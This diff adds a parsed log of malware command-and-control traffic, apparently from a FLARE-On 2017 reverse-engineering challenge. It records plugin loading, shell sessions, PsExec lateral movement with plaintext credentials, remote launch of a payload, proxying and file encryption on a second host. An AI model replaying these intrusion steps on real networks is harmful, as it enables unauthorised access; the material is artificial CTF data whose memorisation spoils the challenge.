@@ -1,0 +1,945 @@
+Processing flows from directory flows/
+Loaded 2 flows
+Done parsing
+############################################################
+Events:
+c2_authenticate: {'password': u'welcomepass1!1'}
+load_module: {'filemd5': 'f873a174ccb567670e222c1f37195cf2',
+ 'module_id': 'c30b1a2dcb489ca8a724376469cf6782',
+ 'module_name': 'plugin_Rc4Crypto.bin'}
+load_module: {'filemd5': '6e8866fc570d74ab21b99f687c108105',
+ 'module_id': '38be0f624ce274fc61f75c90cb3f5915',
+ 'module_name': 'plugin_LookupTableCrypto.bin'}
+load_module: {'filemd5': 'fb5acf29a468df13c2289f3e96027f12',
+ 'module_id': 'ba0504fcc08f9121d16fd3fed1710e60',
+ 'module_name': 'plugin_CustomBase64Crypto.bin'}
+load_module: {'filemd5': '59061be984a290dd9c9320edb569ac71',
+ 'module_id': 'b2e5490d2654059bbbab7f2a67fe5ff4',
+ 'module_name': 'plugin_XteaCrypto.bin'}
+load_module: {'filemd5': '114a99b58940c5f5dd41114fe340468e',
+ 'module_id': '5fd8ea0e9d0a92cbe425109690ce7da2',
+ 'module_name': 'plugin_ZlibCompress.bin'}
+load_module: {'filemd5': '4b05ff9bf7f59bf411a605b24c28a5b5',
+ 'module_id': 'f47c51070fa8698064b65b3b6e7d30c6',
+ 'module_name': 'plugin_FileComamnd.bin'}
+load_module: {'filemd5': 'ac9f33da50bb56522402bf01bb1df548',
+ 'module_id': 'f46d09704b40275fb33790a362762e56',
+ 'module_name': 'plugin_ShellCommand.bin'}
+shell_in: 'cd c:\\\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'cd c:\\work\\\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'cd c:\\work\\FlareOn2017\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'cd c:\\work\\FlareOn2017\\Challenge_10\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'type TODO.txt\r\n'
+shell_in: 'mkdir c:\\staging\r\n'
+shell_in: 'cd c:\\staging\r\n'
+load_module: {'filemd5': '3f002fa74b02da598f39a867e2d052a0',
+ 'module_id': 'a3aecca1cb4faa7a9a594d138a1bfbd5',
+ 'module_name': 'plugin_ScreenCommand.bin'}
+shell_in: 'ping larryjohnson-pc\r\n'
+file_put: {'filemd5': '27304b246c7d5b4e149124d5f93c5b01',
+ 'filename': u'c:\\staging\\pse.exe'}
+file_put: {'filemd5': '27304b246c7d5b4e149124d5f93c5b01',
+ 'filename': u'c:\\staging\\pse.exe'}
+shell_in: 'pse.exe -h\r\n'
+file_put: {'filemd5': 'bf0a86db982de1996c0dc49d681dbe81',
+ 'filename': u'c:\\staging\\srv2.exe'}
+file_put: {'filemd5': 'bf0a86db982de1996c0dc49d681dbe81',
+ 'filename': u'c:\\staging\\srv2.exe'}
+shell_in: 'pse.exe \\\\larryjohnson-pc -i -c -f -d -u larry.johnson -p n3v3rgunnag1veUup -accepteula srv2.exe\r\n'
+load_module: {'filemd5': '9e5ca05e6fe30a37056c290a9fc7177c',
+ 'module_id': '77d6ce92347337aeb14510807ee9d7be',
+ 'module_name': 'plugin_ProxyCommand.bin'}
+shell_in: 'dir\r\n'
+query_plugins: ['  00:155bbf4a1efe1517734604b9d42b80e8:1.2.0:    Command:MainC2Command',
+ '  01:51298f741667d7ed2941950106f50545:1.0.2:     Crypto:NullCrypto',
+ '  02:f37126ad88a5617eaf06000d424c5a21:1.0.1:Compression:NullCompress']
+profile_host: {'default_locale': 1033,
+ 'hostname': u'JOHNJACKSON-PC',
+ 'malware_id': 'c5aaaeccf7f63d8312d673f01e2b042f',
+ 'malware_note': u'feye2017 cli',
+ 'malware_version': '2.1.0',
+ 'os_version': '6.1.7601_2',
+ 'username': u'john.jackson'}
+query_plugins: ['  00:155bbf4a1efe1517734604b9d42b80e8:1.2.0:    Command:MainC2Command',
+ '  01:51298f741667d7ed2941950106f50545:1.0.2:     Crypto:NullCrypto',
+ '  02:c30b1a2dcb489ca8a724376469cf6782:1.0.4:     Crypto:Rc4Crypto',
+ '  03:38be0f624ce274fc61f75c90cb3f5915:1.1.8:     Crypto:LookupTableCrypto',
+ '  04:ba0504fcc08f9121d16fd3fed1710e60:1.0.4:     Crypto:CustomBase64Crypto',
+ '  05:b2e5490d2654059bbbab7f2a67fe5ff4:1.0.1:     Crypto:XteaCrypto',
+ '  06:f37126ad88a5617eaf06000d424c5a21:1.0.1:Compression:NullCompress',
+ '  07:5fd8ea0e9d0a92cbe425109690ce7da2:1.2.11:Compression:ZlibCompress']
+drive_list: [{'drive_letter': u'A:\\',
+  'filesystem': u'',
+  'free_space': 0,
+  'name': u'',
+  'total_space': 0},
+ {'drive_letter': u'C:\\',
+  'filesystem': u'NTFS',
+  'free_space': 55131119616,
+  'name': u'',
+  'total_space': 64422408192},
+ {'drive_letter': u'D:\\',
+  'filesystem': u'',
+  'free_space': 0,
+  'name': u'',
+  'total_space': 0}]
+dir_list: {'dir': u'c:\\\\\\',
+ 'result': [{'accessed_time': 131401251571404950,
+             'attributes': ['HIDDEN', 'SYSTEM', 'DIRECTORY'],
+             'created_time': 128920125750196134,
+             'filename': u'$Recycle.Bin',
+             'modified_time': 131401251571404950,
+             'size': 0},
+            {'accessed_time': 128920106441575908,
+             'attributes': ['ARCHIVE'],
+             'created_time': 128920106441575908,
+             'filename': u'autoexec.bat',
+             'modified_time': 128891437401258876,
+             'size': 24},
+            {'accessed_time': 130058786271306680,
+             'attributes': ['HIDDEN', 'SYSTEM', 'DIRECTORY'],
+             'created_time': 130058786268186675,
+             'filename': u'Boot',
+             'modified_time': 130058786271306680,
+             'size': 0},
+            {'accessed_time': 130058786270058678,
+             'attributes': ['READONLY', 'HIDDEN', 'SYSTEM', 'ARCHIVE'],
+             'created_time': 130058786270058678,
+             'filename': u'bootmgr',
+             'modified_time': 129347621462815197,
+             'size': 383786},
+            {'accessed_time': 130058786272398682,
+             'attributes': ['READONLY', 'HIDDEN', 'SYSTEM', 'ARCHIVE'],
+             'created_time': 130058786272398682,
+             'filename': u'BOOTSECT.BAK',
+             'modified_time': 130058786272398682,
+             'size': 8192},
+            {'accessed_time': 128920106441731907,
+             'attributes': ['ARCHIVE'],
+             'created_time': 128920106441731907,
+             'filename': u'config.sys',
+             'modified_time': 128891437401258876,
+             'size': 10},
+            {'accessed_time': 128920208355488413,
+             'attributes': ['HIDDEN',
+                            'SYSTEM',
+                            'REPARSE_POINT',
+                            'DIRECTORY',
+                            'NOT_CONTENT_INDEXED'],
+             'created_time': 128920208355488413,
+             'filename': u'Documents and Settings',
+             'modified_time': 128920208355488413,
+             'size': 0},
+            {'accessed_time': 130058786667520320,
+             'attributes': ['HIDDEN', 'SYSTEM', 'ARCHIVE'],
+             'created_time': 130058786667520320,
+             'filename': u'pagefile.sys',
+             'modified_time': 131402123329880131,
+             'size': 1073741824},
+            {'accessed_time': 128920126252200916,
+             'attributes': ['DIRECTORY'],
+             'created_time': 128920126252200916,
+             'filename': u'PerfLogs',
+             'modified_time': 128920126252200916,
+             'size': 0},
+            {'accessed_time': 130058789050289949,
+             'attributes': ['READONLY', 'DIRECTORY'],
+             'created_time': 128920126252356915,
+             'filename': u'Program Files',
+             'modified_time': 130058789050289949,
+             'size': 0},
+            {'accessed_time': 130058789050289949,
+             'attributes': ['HIDDEN', 'DIRECTORY', 'NOT_CONTENT_INDEXED'],
+             'created_time': 128920126256100891,
+             'filename': u'ProgramData',
+             'modified_time': 130058789050289949,
+             'size': 0},
+            {'accessed_time': 130058788049308176,
+             'attributes': ['HIDDEN',
+                            'SYSTEM',
+                            'DIRECTORY',
+                            'NOT_CONTENT_INDEXED'],
+             'created_time': 130058788048840175,
+             'filename': u'Recovery',
+             'modified_time': 130058788049308176,
+             'size': 0},
+            {'accessed_time': 130058794585911411,
+             'attributes': ['HIDDEN', 'SYSTEM', 'DIRECTORY'],
+             'created_time': 130058786666896319,
+             'filename': u'System Volume Information',
+             'modified_time': 130058794585911411,
+             'size': 0},
+            {'accessed_time': 131402162184268785,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131401276486610206,
+             'filename': u'temp',
+             'modified_time': 131402162184268785,
+             'size': 0},
+            {'accessed_time': 131401251555804923,
+             'attributes': ['READONLY', 'DIRECTORY'],
+             'created_time': 128920126257972879,
+             'filename': u'Users',
+             'modified_time': 131401251555804923,
+             'size': 0},
+            {'accessed_time': 130058795043304214,
+             'attributes': ['DIRECTORY'],
+             'created_time': 128920126259532869,
+             'filename': u'Windows',
+             'modified_time': 130058795043304214,
+             'size': 0},
+            {'accessed_time': 130140564865057976,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402864909305289,
+             'filename': u'work',
+             'modified_time': 130140564865057976,
+             'size': 0}]}
+dir_list: {'dir': u'c:\\work\\\\\\',
+ 'result': [{'accessed_time': 130140564865057976,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402864909305289,
+             'filename': u'.',
+             'modified_time': 130140564865057976,
+             'size': 0},
+            {'accessed_time': 130140564865057976,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402864909305289,
+             'filename': u'..',
+             'modified_time': 130140564865057976,
+             'size': 0},
+            {'accessed_time': 130140561645188308,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140561645188308,
+             'filename': u'AX_Code',
+             'modified_time': 130140561645188308,
+             'size': 0},
+            {'accessed_time': 130140562567173940,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140562567173940,
+             'filename': u'EX_Code',
+             'modified_time': 130140562567173940,
+             'size': 0},
+            {'accessed_time': 130140564150888722,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140564150888722,
+             'filename': u'FlareOn2016',
+             'modified_time': 130140564150888722,
+             'size': 0},
+            {'accessed_time': 130140562308485474,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140561717572435,
+             'filename': u'FlareOn2017',
+             'modified_time': 130140562308485474,
+             'size': 0},
+            {'accessed_time': 130140564793921851,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140564793921851,
+             'filename': u'HX_Code',
+             'modified_time': 130140564793921851,
+             'size': 0},
+            {'accessed_time': 130140564849769949,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140564849769949,
+             'filename': u'Malware',
+             'modified_time': 130140564849769949,
+             'size': 0},
+            {'accessed_time': 130140564277716944,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140564277716944,
+             'filename': u'NX_Code',
+             'modified_time': 130140564277716944,
+             'size': 0},
+            {'accessed_time': 130140562360005576,
+             'attributes': ['DIRECTORY'],
+             'created_time': 130140562360005576,
+             'filename': u'RSA_factoring',
+             'modified_time': 130140562360005576,
+             'size': 0}]}
+shell_out
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\john.jackson\Downloads>
+shell_out
+cd c:\
+
+c:\>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\
+
+06/10/2009  02:42 PM                24 autoexec.bat
+06/10/2009  02:42 PM                10 config.sys
+07/13/2009  07:37 PM    <DIR>          PerfLogs
+02/20/2013  05:08 PM    <DIR>          Program Files
+05/25/2017  01:03 PM    <DIR>          temp
+05/24/2017  11:45 AM    <DIR>          Users
+02/20/2013  05:18 PM    <DIR>          Windows
+05/26/2013  08:41 AM    <DIR>          work
+               2 File(s)             34 bytes
+               6 Dir(s)  55,131,119,616 bytes free
+
+c:\>
+shell_out
+cd c:\work\
+
+c:\work>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work
+
+05/26/2013  08:41 AM    <DIR>          .
+05/26/2013  08:41 AM    <DIR>          ..
+05/26/2013  08:36 AM    <DIR>          AX_Code
+05/26/2013  08:37 AM    <DIR>          EX_Code
+05/26/2013  08:40 AM    <DIR>          FlareOn2016
+05/26/2013  08:37 AM    <DIR>          FlareOn2017
+05/26/2013  08:41 AM    <DIR>          HX_Code
+05/26/2013  08:41 AM    <DIR>          Malware
+05/26/2013  08:40 AM    <DIR>          NX_Code
+05/26/2013  08:37 AM    <DIR>          RSA_factoring
+               0 File(s)              0 bytes
+              10 Dir(s)  55,131,119,616 bytes free
+
+c:\work>
+shell_out
+cd c:\work\FlareOn2017
+
+c:\work\FlareOn2017>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\FlareOn2017
+
+05/26/2013  08:37 AM    <DIR>          .
+05/26/2013  08:37 AM    <DIR>          ..
+05/26/2013  08:36 AM    <DIR>          Challenge_01
+05/26/2013  08:36 AM    <DIR>          Challenge_02
+05/26/2013  08:36 AM    <DIR>          Challenge_03
+05/26/2013  08:36 AM    <DIR>          Challenge_04
+05/26/2013  08:36 AM    <DIR>          Challenge_05
+05/26/2013  08:36 AM    <DIR>          Challenge_06
+05/26/2013  08:36 AM    <DIR>          Challenge_07
+05/26/2013  08:36 AM    <DIR>          Challenge_08
+05/26/2013  08:36 AM    <DIR>          Challenge_09
+05/26/2017  08:46 AM    <DIR>          Challenge_10
+05/26/2013  08:37 AM    <DIR>          Challenge_11
+05/26/2013  08:37 AM    <DIR>          SecretChallenge_12
+               0 File(s)              0 bytes
+              14 Dir(s)  55,131,119,616 bytes free
+
+c:\work\FlareOn2017>
+shell_out
+cd c:\work\FlareOn2017\Challenge_10
+
+c:\work\FlareOn2017\Challenge_10>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\FlareOn2017\Challenge_10
+
+05/26/2017  08:46 AM    <DIR>          .
+05/26/2017  08:46 AM    <DIR>          ..
+05/26/2017  08:46 AM                28 TODO.txt
+               1 File(s)             28 bytes
+               2 Dir(s)  55,131,119,616 bytes free
+
+c:\work\FlareOn2017\Challenge_10>
+shell_out
+type TODO.txt
+Check with Larry about this.
+c:\work\FlareOn2017\Challenge_10>
+shell_out
+mkdir c:\staging
+
+c:\work\FlareOn2017\Challenge_10>
+shell_out
+cd c:\staging
+
+c:\staging>
+screenshot: {'filemd5': 'df328417c4854dad1d1a6d1e939868c7'}
+shell_out
+ping larryjohnson-pc
+
+Pinging larryjohnson-pc [192.168.221.105] with 32 bytes of data:
+Reply from 192.168.221.105: bytes=32 time<1ms TTL=128
+
+shell_out
+Reply from 192.168.221.105: bytes=32 time<1ms TTL=128
+
+shell_out
+Reply from 192.168.221.105: bytes=32 time<1ms TTL=128
+
+shell_out
+Reply from 192.168.221.105: bytes=32 time<1ms TTL=128
+
+Ping statistics for 192.168.221.105:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+c:\staging>
+shell_out
+pse.exe -h
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+PsExec executes a program on a remote system, where remotely executed console
+applications execute interactively.
+
+Usage: psexec [\\computer[,computer2[,...] | @file]][-u user [-p psswd][-n s][-r servicename][-h][-l][-s|-e][-x][-i [session]][-c [-f|-v]][-w directory][-d][-<priority>][-a n,n,...] cmd [arguments]
+     -a         Separate processors on which the application can run with
+                commas where 1 is the lowest numbered CPU. For example,
+                to run the application on CPU 2 and CPU 4, enter:
+                "-a 2,4"
+     -c         Copy the specified program to the remote system for
+                execution. If you omit this option the application
+                must be in the system path on the remote system.
+     -d         Don't wait for process to terminate (non-interactive).
+     -e         Does not load the specified account's profile.
+     -f         Copy the specified program even if the file already
+                exists on the remote system.
+     -i         Run the program so that it interacts with the desktop of the
+                specified session on the remote system. If no session is
+                specified the process runs in the console session.
+     -h         If the target system is Vista or higher, has the process
+                run with the account's elevated token, if available.
+     -l         Run process as limited user (strips the Administrators group
+                and allows only privileges assigned to the Users group).
+                On Windows Vista the process runs with Low Integrity.
+     -n         Specifies timeout in seconds connecting to remote computers.
+     -p         Specifies optional password for user name. If you omit this
+                you will be prompted to enter a hidden password.
+     -r         Specifies the name of the remote service to create or interact.
+         
+shell_out
+       with.
+     -s         Run the remote process in the System account.
+     -u         Specifies optional user name for login to remote
+                computer.
+     -v         Copy the specified file only if it has a higher version number
+                or is newer on than the one on the remote system.
+     -w         Set the working directory of the process (relative to
+                remote computer).
+     -x         Display the UI on the Winlogon secure desktop (local system
+                only).
+     -arm       Specifies the remote computer is of ARM architecture.
+     -priority	Specifies -low, -belownormal, -abovenormal, -high or
+                -realtime to run the process at a different priority. Use
+                -background to run at low memory and I/O priority on Vista.
+     computer   Direct PsExec to run the application on the remote
+                computer or computers specified. If you omit the computer
+                name PsExec runs the application on the local system, 
+                and if you specify a wildcard (\\*), PsExec runs the
+                command on all computers in the current domain.
+     @file      PsExec will execute the command on each of the computers listed
+                in the file.
+     cmd	    Name of application to execute.
+     arguments  Arguments to pass (note that file paths must be
+                absolute paths on the target system).
+     -accepteula This flag suppresses the display of the license dialog.
+     -nobanner   Do not display the startup banner and copyright message.
+
+You can enclose applications that have spaces in their name with
+quotation marks e.g. psexec \\marklap "c:\long name app.exe".
+Input is only passed to the remote system when you press the enter
+key, and typing Ctrl-C terminates the remote process.
+
+If you omit a user name the process will run in the context of your
+account on the remote system, but will not have access to network
+resources (because it is impersonating). Specify a valid user n
+shell_out
+ame
+in the Domain\User syntax if the remote process requires access
+to network resources or to run in a different account. Note that
+the password and command is encrypted in transit to the remote system.
+
+Error codes returned by PsExec are specific to the applications you
+execute, not PsExec.
+
+
+c:\staging>
+shell_out
+pse.exe \\larryjohnson-pc -i -c -f -d -u larry.johnson -p n3v3rgunnag1veUup -accepteula srv2.exe
+
+shell_out
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+shell_out
+Connecting to larryjohnson-pc...Starting PSEXESVC service on larryjohnson-pc...Connecting with PsExec service on larryjohnson-pc...Copying srv2.exe to larryjohnson-pc...Starting srv2.exe on larryjohnson-pc...
+srv2.exe started on larryjohnson-pc with process ID 3000.
+
+c:\staging>
+query_proxy_connections: [{'hostname': '192.168.221.105', 'index': 0, 'port': 16452, 'run_flag': 1}]
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\staging
+
+08/01/2017  10:07 AM    <DIR>          .
+08/01/2017  10:07 AM    <DIR>          ..
+08/01/2017  10:07 AM           339,096 pse.exe
+08/01/2017  10:07 AM           119,808 srv2.exe
+               2 File(s)        458,904 bytes
+               2 Dir(s)  55,130,656,768 bytes free
+
+c:\staging>
+proxy_connect: {'remote_host': '192.168.221.105', 'remote_port': 16452}
+c2_authenticate: {'password': u'welcomepass1!1'}
+load_module: {'filemd5': '935579cedacc17cc09096bb2fdf94b67',
+ 'module_id': '2965e4a19b6e9d9473f5f54dfef93533',
+ 'module_name': 'plugin_BlowfishCrypto.bin'}
+load_module: {'filemd5': 'bc9dd7421b8ac9494c63ca914dd20131',
+ 'module_id': '8746e7b7b0c1b9cf3f11ecae78a3a4bc',
+ 'module_name': 'plugin_SimpleXorCrypto.bin'}
+load_module: {'filemd5': '7a199d23e020cee581d01abdb656bb29',
+ 'module_id': '46c5525904f473ace7bb8cb58b29968a',
+ 'module_name': 'plugin_Des3Crypto.bin'}
+load_module: {'filemd5': '7ce8b4d35df8c7da55789ab8cf372f5f',
+ 'module_id': '9b1f6ec7d9b42bf7758a094a2186986b',
+ 'module_name': 'plugin_CamelliaCrypto.bin'}
+load_module: {'filemd5': 'e6895743ba3e996036d65f80fbae1827',
+ 'module_id': '503b6412c75a7c7558d1c92683225449',
+ 'module_name': 'plugin_ApLibCompress.bin'}
+load_module: {'filemd5': '5abd114aeb2af11c9b12c4918c5eb261',
+ 'module_id': '0a7874d2478a7713705e13dd9b31a6b1',
+ 'module_name': 'plugin_LzoCompress.bin'}
+load_module: {'filemd5': '3f002fa74b02da598f39a867e2d052a0',
+ 'module_id': 'a3aecca1cb4faa7a9a594d138a1bfbd5',
+ 'module_name': 'plugin_ScreenCommand.bin'}
+load_module: {'filemd5': '4b05ff9bf7f59bf411a605b24c28a5b5',
+ 'module_id': 'f47c51070fa8698064b65b3b6e7d30c6',
+ 'module_name': 'plugin_FileComamnd.bin'}
+load_module: {'filemd5': 'ac9f33da50bb56522402bf01bb1df548',
+ 'module_id': 'f46d09704b40275fb33790a362762e56',
+ 'module_name': 'plugin_ShellCommand.bin'}
+shell_in: 'cd c:\\\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'cd work\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'cd flareon2017\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'type README.md\r\n'
+shell_in: 'cd package\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'mkdir c:\\staging\r\n'
+file_put: {'filemd5': '22eef49edcaa9db5bdf90bb0147fb8b3',
+ 'filename': u'c:\\staging\\cf.exe'}
+file_put: {'filemd5': '22eef49edcaa9db5bdf90bb0147fb8b3',
+ 'filename': u'c:\\staging\\cf.exe'}
+shell_in: 'c:\\staging\\cf.exe lab10.zip tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=\r\n'
+shell_in: 'dir\r\n'
+shell_in: 'del lab10*\r\n'
+shell_in: 'dir\r\n'
+query_plugins: ['  00:155bbf4a1efe1517734604b9d42b80e8:1.2.0:    Command:MainC2Command',
+ '  01:51298f741667d7ed2941950106f50545:1.0.2:     Crypto:NullCrypto',
+ '  02:f37126ad88a5617eaf06000d424c5a21:1.0.1:Compression:NullCompress']
+profile_host: {'default_locale': 1033,
+ 'hostname': u'LARRYJOHNSON-PC',
+ 'malware_id': 'c5aaaeccf7f63d8312d673f01e2b042f',
+ 'malware_note': u'feye2017 srv',
+ 'malware_version': '2.1.0',
+ 'os_version': '6.1.7601_2',
+ 'username': u'larry.johnson'}
+query_plugins: ['  00:155bbf4a1efe1517734604b9d42b80e8:1.2.0:    Command:MainC2Command',
+ '  01:51298f741667d7ed2941950106f50545:1.0.2:     Crypto:NullCrypto',
+ '  02:2965e4a19b6e9d9473f5f54dfef93533:1.1.1:     Crypto:BlowfishCrypto',
+ '  03:8746e7b7b0c1b9cf3f11ecae78a3a4bc:1.0.0:     Crypto:SimpleXorCrypto',
+ '  04:46c5525904f473ace7bb8cb58b29968a:1.2.4:     Crypto:Des3Crypto',
+ '  05:9b1f6ec7d9b42bf7758a094a2186986b:1.9.3:     Crypto:CamelliaCrypto',
+ '  06:f37126ad88a5617eaf06000d424c5a21:1.0.1:Compression:NullCompress',
+ '  07:503b6412c75a7c7558d1c92683225449:1.1.1:Compression:ApLibCompress',
+ '  08:0a7874d2478a7713705e13dd9b31a6b1:2.0.6:Compression:LzoCompress']
+screenshot: {'filemd5': '15801d18d54c9fa94010f48ab97096c6'}
+drive_list: [{'drive_letter': u'A:\\',
+  'filesystem': u'',
+  'free_space': 0,
+  'name': u'',
+  'total_space': 0},
+ {'drive_letter': u'C:\\',
+  'filesystem': u'NTFS',
+  'free_space': 55136497664,
+  'name': u'',
+  'total_space': 64422408192},
+ {'drive_letter': u'D:\\',
+  'filesystem': u'',
+  'free_space': 0,
+  'name': u'',
+  'total_space': 0}]
+dir_list: {'dir': u'c:\\\\\\',
+ 'result': [{'accessed_time': 131401251571404950,
+             'attributes': ['HIDDEN', 'SYSTEM', 'DIRECTORY'],
+             'created_time': 128920125750196134,
+             'filename': u'$Recycle.Bin',
+             'modified_time': 131401251571404950,
+             'size': 0},
+            {'accessed_time': 128920106441575908,
+             'attributes': ['ARCHIVE'],
+             'created_time': 128920106441575908,
+             'filename': u'autoexec.bat',
+             'modified_time': 128891437401258876,
+             'size': 24},
+            {'accessed_time': 130058786271306680,
+             'attributes': ['HIDDEN', 'SYSTEM', 'DIRECTORY'],
+             'created_time': 130058786268186675,
+             'filename': u'Boot',
+             'modified_time': 130058786271306680,
+             'size': 0},
+            {'accessed_time': 130058786270058678,
+             'attributes': ['READONLY', 'HIDDEN', 'SYSTEM', 'ARCHIVE'],
+             'created_time': 130058786270058678,
+             'filename': u'bootmgr',
+             'modified_time': 129347621462815197,
+             'size': 383786},
+            {'accessed_time': 130058786272398682,
+             'attributes': ['READONLY', 'HIDDEN', 'SYSTEM', 'ARCHIVE'],
+             'created_time': 130058786272398682,
+             'filename': u'BOOTSECT.BAK',
+             'modified_time': 130058786272398682,
+             'size': 8192},
+            {'accessed_time': 128920106441731907,
+             'attributes': ['ARCHIVE'],
+             'created_time': 128920106441731907,
+             'filename': u'config.sys',
+             'modified_time': 128891437401258876,
+             'size': 10},
+            {'accessed_time': 128920208355488413,
+             'attributes': ['HIDDEN',
+                            'SYSTEM',
+                            'REPARSE_POINT',
+                            'DIRECTORY',
+                            'NOT_CONTENT_INDEXED'],
+             'created_time': 128920208355488413,
+             'filename': u'Documents and Settings',
+             'modified_time': 128920208355488413,
+             'size': 0},
+            {'accessed_time': 130058786667520320,
+             'attributes': ['HIDDEN', 'SYSTEM', 'ARCHIVE'],
+             'created_time': 130058786667520320,
+             'filename': u'pagefile.sys',
+             'modified_time': 131401464694700158,
+             'size': 1073741824},
+            {'accessed_time': 128920126252200916,
+             'attributes': ['DIRECTORY'],
+             'created_time': 128920126252200916,
+             'filename': u'PerfLogs',
+             'modified_time': 128920126252200916,
+             'size': 0},
+            {'accessed_time': 130058789050289949,
+             'attributes': ['READONLY', 'DIRECTORY'],
+             'created_time': 128920126252356915,
+             'filename': u'Program Files',
+             'modified_time': 130058789050289949,
+             'size': 0},
+            {'accessed_time': 130058789050289949,
+             'attributes': ['HIDDEN', 'DIRECTORY', 'NOT_CONTENT_INDEXED'],
+             'created_time': 128920126256100891,
+             'filename': u'ProgramData',
+             'modified_time': 130058789050289949,
+             'size': 0},
+            {'accessed_time': 130058788049308176,
+             'attributes': ['HIDDEN',
+                            'SYSTEM',
+                            'DIRECTORY',
+                            'NOT_CONTENT_INDEXED'],
+             'created_time': 130058788048840175,
+             'filename': u'Recovery',
+             'modified_time': 130058788049308176,
+             'size': 0},
+            {'accessed_time': 130058794585911411,
+             'attributes': ['HIDDEN', 'SYSTEM', 'DIRECTORY'],
+             'created_time': 130058786666896319,
+             'filename': u'System Volume Information',
+             'modified_time': 130058794585911411,
+             'size': 0},
+            {'accessed_time': 131401301798756171,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131401290722685153,
+             'filename': u'temp',
+             'modified_time': 131401301798756171,
+             'size': 0},
+            {'accessed_time': 131401251555804923,
+             'attributes': ['READONLY', 'DIRECTORY'],
+             'created_time': 128920126257972879,
+             'filename': u'Users',
+             'modified_time': 131401251555804923,
+             'size': 0},
+            {'accessed_time': 131460809090561681,
+             'attributes': ['DIRECTORY'],
+             'created_time': 128920126259532869,
+             'filename': u'Windows',
+             'modified_time': 131460809090561681,
+             'size': 0},
+            {'accessed_time': 131402110171404269,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402108897471776,
+             'filename': u'work',
+             'modified_time': 131402110171404269,
+             'size': 0}]}
+dir_list: {'dir': u'c:\\work\\\\',
+ 'result': [{'accessed_time': 131402110171404269,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402108897471776,
+             'filename': u'.',
+             'modified_time': 131402110171404269,
+             'size': 0},
+            {'accessed_time': 131402110171404269,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402108897471776,
+             'filename': u'..',
+             'modified_time': 131402110171404269,
+             'size': 0},
+            {'accessed_time': 131402109503255096,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109503255096,
+             'filename': u'bestinbreed',
+             'modified_time': 131402109503255096,
+             'size': 0},
+            {'accessed_time': 131402109374554870,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109374554870,
+             'filename': u'coolstuff',
+             'modified_time': 131402109374554870,
+             'size': 0},
+            {'accessed_time': 131402109783899589,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109783899589,
+             'filename': u'cyberdisruptor',
+             'modified_time': 131402109783899589,
+             'size': 0},
+            {'accessed_time': 131402110149720231,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402110149720231,
+             'filename': u'flareon2015',
+             'modified_time': 131402110149720231,
+             'size': 0},
+            {'accessed_time': 131402109311530759,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109311530759,
+             'filename': u'flareon2016',
+             'modified_time': 131402109311530759,
+             'size': 0},
+            {'accessed_time': 131402109246410615,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109011959978,
+             'filename': u'flareon2017',
+             'modified_time': 131402109246410615,
+             'size': 0},
+            {'accessed_time': 131402109442726989,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109442726989,
+             'filename': u'gamechanger',
+             'modified_time': 131402109442726989,
+             'size': 0},
+            {'accessed_time': 131402109878123754,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109878123754,
+             'filename': u'innovation',
+             'modified_time': 131402109878123754,
+             'size': 0},
+            {'accessed_time': 131402109566123206,
+             'attributes': ['DIRECTORY'],
+             'created_time': 131402109566123206,
+             'filename': u'paradigmshifter',
+             'modified_time': 131402109566123206,
+             'size': 0}]}
+shell_out
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+shell_out
+cd c:\
+
+c:\>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\
+
+06/10/2009  02:42 PM                24 autoexec.bat
+06/10/2009  02:42 PM                10 config.sys
+07/13/2009  07:37 PM    <DIR>          PerfLogs
+02/20/2013  05:08 PM    <DIR>          Program Files
+05/24/2017  01:09 PM    <DIR>          temp
